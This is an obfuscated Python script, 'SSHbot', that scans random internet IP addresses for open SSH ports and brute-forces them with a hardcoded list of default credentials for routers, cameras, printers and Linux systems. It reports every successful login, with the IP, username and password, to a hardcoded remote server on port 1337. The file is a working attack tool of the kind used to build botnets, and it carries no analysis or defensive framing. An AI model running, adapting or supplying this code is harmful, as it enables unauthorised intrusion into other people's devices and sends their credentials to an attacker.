import paramiko #line:1
import socket #line:2
import random #line:3
import time #line:4
from colored import Fore ,Style #line:5
from concurrent .futures import ThreadPoolExecutor #line:6
class SSHbot :#line:8
    cracked =0 #line:9
    username_password_list =[('admin','admin'),('admin','123456'),('admin','password'),('root','root'),('user','user'),('guest','guest'),('admin','letmein'),('admin','admin123'),('root','toor'),('root','roottoor'),('root','rootroot'),('admin','cisco'),('admin','linksys'),('admin','tplink'),('admin','huawei'),('admin','dlink'),('admin','netgear'),('admin','motorola'),('admin','sbcglobal'),('admin','verizon'),('admin','123456'),('admin','abc123'),('admin','default'),('admin','letmein'),('admin','camera'),('admin','hikvision'),('admin','foscam'),('admin','ipcamera'),('admin','admin@123'),('admin','admin1'),('admin','print'),('admin','pass'),('admin','printer'),('admin','hp123'),('admin','epson123'),('admin','raspberry'),('user','user'),('admin','1q2w3e4r'),('root','raspberry'),('ubnt','ubnt'),('root','ubnt'),('admin','welcome'),('admin','rootpass'),('user','password'),('user','qwerty'),('root','admin'),('admin','superuser'),('admin','12345678'),('admin','mypassword'),('admin','guestuser'),('admin','letmein123'),('admin','p@ssw0rd'),('admin','123321'),('root','12345'),('root','1234'),('root','admin12345'),('user','letmein'),('user','123123'),('admin','welcome123'),('admin','1qaz2wsx'),('admin','password1'),('admin','qwerty123'),('user','iloveyou'),('root','toor123'),('guest','guest123'),('admin','abc12345'),('admin','1qazxsw2'),('user','secret'),('user','qazwsx'),('admin','letmein1'),('root','password123'),('admin','test123'),('admin','root12345'),('user','12345abc'),('admin','123qwe'),('admin','1pass'),('root','admin1'),('admin','n0tpassword'),('admin','abcde'),('user','welcome1'),('admin','password1234'),('root','letmein1234'),('admin','testpass'),('admin','1password'),('user','qwertyuiop'),('admin','password!'),('admin','azertyuiop'),('user','passw0rd'),('user','welcome1234'),('admin','superadmin'),('root','password!'),('user','password!123'),('guest','guestpassword'),('admin','admin@1234'),('user','root1234'),('admin','hello123'),('user','12345user'),('root','qwerty1234'),('user','user123'),('admin','letmein!'),('admin','root123456'),('root','adminadmin'),('user','letmein12345'),('root','minecraft'),('ubuntu','ubuntu'),('debian','debian'),('root','centos'),('root','fedora'),('root','arch'),('root','redhat'),('root','linux'),('kali','kali'),]#line:147
    port =22 #line:149
    ip_list =[]#line:150
    max_threads =4024 #line:151
    server_ip ='78.138.130.114'#line:152
    server_port =1337 #line:153
    def __init__ (OO0O0O0OOOO00O0OO ):#line:155
        OO0O0O0OOOO00O0OO .server_connected =False #line:156
    def connect_to_server (OOO0OO00OOOOO0OO0 ):#line:158
        while True :#line:159
            try :#line:160
                OOO0OO00OOOOO0OO0 .server_sock =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:161
                OOO0OO00OOOOO0OO0 .server_sock .connect ((OOO0OO00OOOOO0OO0 .server_ip ,OOO0OO00OOOOO0OO0 .server_port ))#line:162
                break #line:163
            except Exception :#line:164
                time .sleep (1 )#line:165
    def send_to_server (O0O00O0O0OO00O00O ,O000O000OO000O0O0 ):#line:167
        if not O0O00O0O0OO00O00O .server_connected :#line:168
            O0O00O0O0OO00O00O .connect_to_server ()#line:169
        try :#line:171
            O0O00O0O0OO00O00O .server_sock .sendall (O000O000OO000O0O0 .encode ('utf-8'))#line:172
        except Exception :#line:173
            O0O00O0O0OO00O00O .server_connected =False #line:174
            O0O00O0O0OO00O00O .connect_to_server ()#line:175
    def generate_ips (O000000O000O0O0O0 ,O0OO000OOOOO00O0O ):#line:177
        O000000O000O0O0O0 .ip_list =[]#line:178
        O0OOOOOOO0OO00O0O =["1","2","5","7","8","11","14","15","31","37","39","41","43","49","58","59","60","61","62","64","66","70","72","77","78","79","80","82","86","89","90","91","92","93","94","95","96","97","98","100"]#line:179
        for _O00OOOOO000000O00 in range (O0OO000OOOOO00O0O ):#line:180
            OOO00O00O00000O00 =random .choice (O0OOOOOOO0OO00O0O )#line:181
            OO000O0OO00OO0O0O =f"{OOO00O00O00000O00}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(0, 255)}"#line:182
            O000000O000O0O0O0 .ip_list .append (OO000O0OO00OO0O0O )#line:183
    def check_port (OO0O0OO000000O0O0 ,OO00O000OO000O0O0 ,O00OO00O000OO0O00 ):#line:185
        try :#line:186
            O000OOO000O00O00O =socket .socket (socket .AF_INET ,socket .SOCK_STREAM )#line:187
            O000OOO000O00O00O .settimeout (2 )#line:188
            OOOO0O00O0OO0OO0O =O000OOO000O00O00O .connect_ex ((OO00O000OO000O0O0 ,O00OO00O000OO0O00 ))#line:189
            O000OOO000O00O00O .close ()#line:190
            return OOOO0O00O0OO0OO0O ==0 #line:191
        except :#line:192
            return False #line:193
    def ssh_connect (O0O0OO0O000O00000 ,O0OO000O0OOO00O0O ,O0OO000000000OOOO ,OOO0OO000OO00OO0O ,OOOO0OO0O0OOOOO0O =0 ):#line:195
        OO000OO0O00O0OO0O =paramiko .SSHClient ()#line:196
        OO000OO0O00O0OO0O .set_missing_host_key_policy (paramiko .AutoAddPolicy ())#line:197
        try :#line:198
            OO000OO0O00O0OO0O .connect (O0OO000O0OOO00O0O ,O0O0OO0O000O00000 .port ,O0OO000000000OOOO ,OOO0OO000OO00OO0O ,banner_timeout =15 ,allow_agent =False ,look_for_keys =False )#line:199
        except paramiko .AuthenticationException :#line:200
            OOOO0OO0O0OOOOO0O =1 #line:201
        except paramiko .SSHException :#line:202
            return 2 #line:203
        except socket .error :#line:204
            return 3 #line:205
        finally :#line:206
            OO000OO0O00O0OO0O .close ()#line:207
        return OOOO0OO0O0OOOOO0O #line:208
    def run (O0OO00000OOO0O0O0 ):#line:210
        while True :#line:211
            O0OO00000OOO0O0O0 .generate_ips (1024 )#line:212
            with ThreadPoolExecutor (max_workers =O0OO00000OOO0O0O0 .max_threads )as O0O0OO000O0O000OO :#line:213
                for O0O0OOO00OO0000OO in O0OO00000OOO0O0O0 .ip_list :#line:214
                    O0O0OO000O0O000OO .submit (O0OO00000OOO0O0O0 .process_ip ,O0O0OOO00OO0000OO )#line:215
    def process_ip (OOO0OO000O0O0OO0O ,OOO000OOOOOOO0O0O ):#line:217
        if OOO0OO000O0O0OO0O .check_port (OOO000OOOOOOO0O0O ,OOO0OO000O0O0OO0O .port ):#line:218
            OOO0OO000O0O0OO0O .main (OOO000OOOOOOO0O0O )#line:219
        time .sleep (0.01 )#line:220
    def main (OOOOOO0O000O00OO0 ,O00O00OOO00OOO0O0 ):#line:222
        O0000OOOOOOO00000 =False #line:223
        for OOO000OOO0O0O0O0O ,OOOOO0OOO0000O0OO in OOOOOO0O000O00OO0 .username_password_list :#line:224
            if O0000OOOOOOO00000 :#line:225
                break #line:226
            try :#line:227
                O0000OOO00000OO00 =OOOOOO0O000O00OO0 .ssh_connect (O00O00OOO00OOO0O0 ,OOO000OOO0O0O0O0O ,OOOOO0OOO0000O0OO )#line:228
                if O0000OOO00000OO00 ==0 :#line:230
                    O0000000OO0O0OO0O =f'\t{Fore.green}[*] {O00O00OOO00OOO0O0} [*] {OOO000OOO0O0O0O0O} [*] Pass: {OOOOO0OOO0000O0OO} => Login Correct *** <={Style.reset}'#line:231
                    print (O0000000OO0O0OO0O )#line:232
                    OOOOOO0O000O00OO0 .send_to_server (O0000000OO0O0OO0O )#line:233
                    OOOOOO0O000O00OO0 .cracked +=1 #line:234
                    O0000OOOOOOO00000 =True #line:235
                    break #line:236
                elif O0000OOO00000OO00 ==1 :#line:237
                    print (f'\t{Fore.red}[-] {O00O00OOO00OOO0O0} [USER: {OOO000OOO0O0O0O0O}] [PASSWORD: {OOOOO0OOO0000O0OO}] => Login Incorrect.{Style.reset}')#line:238
                elif O0000OOO00000OO00 in [2 ,3 ]:#line:239
                    O0000OOOOOOO00000 =True #line:240
                    break #line:241
            except Exception :#line:242
                pass #line:243
if __name__ =='__main__':#line:245
    try :#line:246
        s =SSHbot ()#line:247
        s .connect_to_server ()#line:248
        s .run ()#line:249
    except KeyboardInterrupt :#line:250
        pass #line:251
